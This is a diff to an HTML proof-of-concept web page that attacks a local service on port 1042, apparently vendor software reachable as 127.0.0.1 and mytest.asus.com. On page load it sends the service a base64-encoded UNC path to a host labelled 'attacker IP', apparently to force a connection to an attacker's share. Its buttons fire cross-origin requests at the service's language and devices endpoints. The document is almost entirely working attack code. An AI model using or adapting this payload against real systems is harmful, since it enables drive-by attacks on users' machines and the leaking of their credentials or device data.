@@ -8,19 +8,24 @@
 <body>
     <h1>Welcome to our website!</h1>
     <p>Loading content, please wait...</p>
-    <button type="button" onclick="sendRequest()">Send</button>
+    <button type="button" onclick="sendRequest1()">Send to 127.0.0.1</button>
+    <button type="button" onclick="sendRequest2()">Send to mytest.asus.com</button>
     <button type="button" onclick="putImage()">Put image</button>
     <script>
         // attacker IP = 192.168.48.134
         new Image().src = 'http://127.0.0.1:1042/type/1/model/x/image/' + btoa('\\\\192.168.48.134\\s\\i.jpg');
 
-        function sendRequest() {
+        function sendRequest1() {
             fetch('http://127.0.0.1:1042/lib/1/language');
+        }
+
+        function sendRequest2() {
+            fetch('http://mytest.asus.com:1042/lib/1/language');
         }
 
         function putImage() {
             const img = document.createElement('img');
-            img.src = 'http://127.0.0.1:1042/lib/1/language';
+            img.src = 'http://127.0.0.1:1042/lib/1/devices';
             document.body.appendChild(img);
         }
     </script>
